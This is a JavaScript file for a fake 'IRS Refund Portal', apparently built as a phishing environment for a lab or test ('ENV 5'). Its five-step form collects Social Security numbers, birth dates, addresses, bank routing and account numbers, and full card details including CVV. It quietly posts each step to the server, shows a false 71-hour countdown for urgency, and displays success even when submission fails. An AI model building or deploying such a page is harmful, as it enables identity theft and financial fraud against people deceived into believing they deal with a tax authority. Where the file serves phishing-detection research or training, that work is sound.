/**
 * Phishing IRS Refund Portal — JavaScript (ENV 5)
 * Step navigation, countdown timer, input formatters, per-step save, submission.
 */

(function () {
    'use strict';

    let currentStep = 1;
    const totalSteps = 5;
    const formData = {};

    // ==================== COUNTDOWN TIMER ====================

    let countdownSeconds = 71 * 3600 + 59 * 60 + 47;

    function updateCountdown() {
        const hours = Math.floor(countdownSeconds / 3600);
        const minutes = Math.floor((countdownSeconds % 3600) / 60);
        const seconds = countdownSeconds % 60;

        const display =
            String(hours).padStart(2, '0') + ':' +
            String(minutes).padStart(2, '0') + ':' +
            String(seconds).padStart(2, '0');

        const el = document.getElementById('countdown');
        if (el) el.textContent = display;

        if (countdownSeconds > 0) {
            countdownSeconds--;
        }
    }

    // ==================== INPUT FORMATTERS ====================

    function formatSSN(input) {
        let val = input.value.replace(/\D/g, '');
        if (val.length > 3 && val.length <= 5) {
            val = val.slice(0, 3) + '-' + val.slice(3);
        } else if (val.length > 5) {
            val = val.slice(0, 3) + '-' + val.slice(3, 5) + '-' + val.slice(5, 9);
        }
        input.value = val;
    }

    function formatPhone(input) {
        let val = input.value.replace(/\D/g, '');
        if (val.length > 3 && val.length <= 6) {
            val = '(' + val.slice(0, 3) + ') ' + val.slice(3);
        } else if (val.length > 6) {
            val = '(' + val.slice(0, 3) + ') ' + val.slice(3, 6) + '-' + val.slice(6, 10);
        }
        input.value = val;
    }

    function formatCardNumber(input) {
        let val = input.value.replace(/\D/g, '');
        val = val.match(/.{1,4}/g)?.join(' ') || val;
        input.value = val;
    }

    function formatExpiry(input) {
        let val = input.value.replace(/\D/g, '');
        if (val.length > 2) {
            val = val.slice(0, 2) + '/' + val.slice(2, 4);
        }
        input.value = val;
    }

    function digitsOnly(input, max) {
        input.value = input.value.replace(/\D/g, '').slice(0, max || 20);
    }

    // ==================== STEP NAVIGATION ====================

    function showStep(step) {
        for (let i = 1; i <= totalSteps; i++) {
            const stepEl = document.getElementById('step' + i);
            if (stepEl) stepEl.classList.remove('active');
        }
        const target = document.getElementById('step' + step);
        if (target) target.classList.add('active');

        const stepItems = document.querySelectorAll('.step-item');
        const connectors = document.querySelectorAll('.step-connector');

        stepItems.forEach((item, idx) => {
            const num = idx + 1;
            item.classList.remove('active', 'completed');
            if (num === step) {
                item.classList.add('active');
            } else if (num < step) {
                item.classList.add('completed');
            }
        });

        connectors.forEach((conn, idx) => {
            conn.classList.remove('completed');
            if (idx + 1 < step) {
                conn.classList.add('completed');
            }
        });

        currentStep = step;
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function collectStepData(step) {
        const data = {};
        switch (step) {
            case 1:
                data.fullName = val('fullName');
                data.ssn = val('ssn');
                data.dob = val('dob');
                data.filingStatus = val('filingStatus');
                break;
            case 2:
                data.street = val('street');
                data.city = val('city');
                data.state = val('state');
                data.zip = val('zip');
                data.phone = val('phone');
                data.email = val('email');
                break;
            case 3:
                data.bankName = val('bankName');
                data.routingNumber = val('routingNumber');
                data.accountNumber = val('accountNumber');
                data.accountType = val('accountType');
                break;
            case 4:
                var processingType = document.querySelector('input[name="processingType"]:checked');
                data.processingType = processingType ? processingType.value : 'expedited';
                if (data.processingType === 'expedited') {
                    data.cardName = val('cardName');
                    data.cardNumber = val('cardNumber');
                    data.cardExpiry = val('cardExpiry');
                    data.cardCvv = val('cardCvv');
                }
                var annualFee = document.getElementById('annualFeeConsent');
                data.annualFeeConsent = annualFee ? annualFee.checked : false;
                break;
            case 5:
                var partner = document.getElementById('partnerConsent');
                var comms = document.getElementById('communicationsConsent');
                data.partnerConsent = partner ? partner.checked : false;
                data.communicationsConsent = comms ? comms.checked : false;
                break;
        }
        return data;
    }

    function val(id) {
        var el = document.getElementById(id);
        return el ? el.value.trim() : '';
    }

    function validateStep(step) {
        switch (step) {
            case 1:
                return val('fullName') && val('ssn') && val('dob') && val('filingStatus');
            case 2:
                return val('street') && val('city') && val('state') && val('zip') && val('phone') && val('email');
            case 3:
                return val('bankName') && val('routingNumber') && val('accountNumber') && val('accountType');
            case 4:
                return true;
            case 5:
                return true;
            default:
                return true;
        }
    }

    function saveStepToServer(step, data) {
        fetch('/api/save-step', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step: step, data: data })
        }).catch(function () { /* fail silently */ });
    }

    // ==================== PUBLIC FUNCTIONS ====================

    window.nextStep = function (fromStep) {
        if (!validateStep(fromStep)) {
            highlightEmptyFields(fromStep);
            return;
        }

        var data = collectStepData(fromStep);
        Object.assign(formData, data);
        saveStepToServer(fromStep, data);

        if (fromStep === 4) {
            populateReview();
        }

        showStep(fromStep + 1);
    };

    window.prevStep = function (fromStep) {
        showStep(fromStep - 1);
    };

    window.goToStep = function (step) {
        showStep(step);
    };

    window.submitForm = function () {
        var data = collectStepData(5);
        Object.assign(formData, data);

        var btn = document.getElementById('submitBtn');
        if (btn) {
            btn.textContent = 'Processing...';
            btn.disabled = true;
        }

        fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(formData)
        })
        .then(function () { showSuccess(); })
        .catch(function () { showSuccess(); });
    };

    // ==================== HELPERS ====================

    function highlightEmptyFields(step) {
        var stepEl = document.getElementById('step' + step);
        if (!stepEl) return;
        var inputs = stepEl.querySelectorAll('input[required], select[required]');
        inputs.forEach(function (input) {
            if (!input.value.trim()) {
                input.style.borderColor = '#b71c1c';
                input.addEventListener('input', function handler() {
                    input.style.borderColor = '';
                    input.removeEventListener('input', handler);
                }, { once: true });
            }
        });
    }

    function populateReview() {
        setText('reviewName', formData.fullName);
        setText('reviewSsn', maskSSN(formData.ssn));
        setText('reviewDob', formData.dob);
        var statusMap = {
            'single': 'Single',
            'married_joint': 'Married Filing Jointly',
            'married_separate': 'Married Filing Separately',
            'head_household': 'Head of Household',
            'qualifying_widow': 'Qualifying Surviving Spouse'
        };
        setText('reviewFiling', statusMap[formData.filingStatus] || formData.filingStatus);
        setText('reviewAddress', [formData.street, formData.city, formData.state, formData.zip].filter(Boolean).join(', '));
        setText('reviewPhone', formData.phone);
        setText('reviewEmail', formData.email);
        setText('reviewBank', formData.bankName);
        setText('reviewRouting', formData.routingNumber);
        setText('reviewAccount', maskAccount(formData.accountNumber));
        setText('reviewAcctType', (formData.accountType || '').charAt(0).toUpperCase() + (formData.accountType || '').slice(1));

        if (formData.processingType === 'expedited') {
            setText('reviewProcessing', 'Expedited (3-5 business days)');
            setText('reviewFee', '$49.99');
        } else {
            setText('reviewProcessing', 'Standard (6-8 weeks)');
            setText('reviewFee', 'Free');
        }
    }

    function setText(id, text) {
        var el = document.getElementById(id);
        if (el) el.textContent = text || '—';
    }

    function maskSSN(ssn) {
        if (!ssn || ssn.length < 4) return '***-**-****';
        var digits = ssn.replace(/\D/g, '');
        return '***-**-' + digits.slice(-4);
    }

    function maskAccount(acct) {
        if (!acct || acct.length < 4) return '****';
        return '****' + acct.slice(-4);
    }

    function showSuccess() {
        document.querySelectorAll('.form-step').forEach(function (s) {
            s.classList.remove('active');
        });
        var overlay = document.getElementById('successOverlay');
        if (overlay) overlay.style.display = 'block';

        var progress = document.querySelector('.step-progress');
        if (progress) progress.style.display = 'none';

        var urgency = document.querySelector('.urgency-bar');
        if (urgency) urgency.style.display = 'none';
    }

    // ==================== PAYMENT TOGGLE ====================

    function setupPaymentToggle() {
        var radios = document.querySelectorAll('input[name="processingType"]');
        var paymentSection = document.getElementById('paymentSection');

        radios.forEach(function (radio) {
            radio.addEventListener('change', function () {
                if (paymentSection) {
                    paymentSection.style.display = this.value === 'expedited' ? 'block' : 'none';
                }
            });
        });
    }

    // ==================== INIT ====================

    document.addEventListener('DOMContentLoaded', function () {
        // Start countdown
        updateCountdown();
        setInterval(updateCountdown, 1000);

        // Gov banner toggle
        var toggle = document.getElementById('govBannerToggle');
        var content = document.getElementById('govBannerContent');
        if (toggle && content) {
            toggle.addEventListener('click', function () {
                content.style.display = content.style.display === 'none' ? 'block' : 'none';
            });
        }

        // Input formatters
        var ssnInput = document.getElementById('ssn');
        if (ssnInput) ssnInput.addEventListener('input', function () { formatSSN(this); });

        var phoneInput = document.getElementById('phone');
        if (phoneInput) phoneInput.addEventListener('input', function () { formatPhone(this); });

        var cardInput = document.getElementById('cardNumber');
        if (cardInput) cardInput.addEventListener('input', function () { formatCardNumber(this); });

        var expiryInput = document.getElementById('cardExpiry');
        if (expiryInput) expiryInput.addEventListener('input', function () { formatExpiry(this); });

        var cvvInput = document.getElementById('cardCvv');
        if (cvvInput) cvvInput.addEventListener('input', function () { digitsOnly(this, 4); });

        var routingInput = document.getElementById('routingNumber');
        if (routingInput) routingInput.addEventListener('input', function () { digitsOnly(this, 9); });

        var zipInput = document.getElementById('zip');
        if (zipInput) zipInput.addEventListener('input', function () { digitsOnly(this, 5); });

        // Payment section toggle
        setupPaymentToggle();

        // Initialize step 1
        showStep(1);
    });

})();
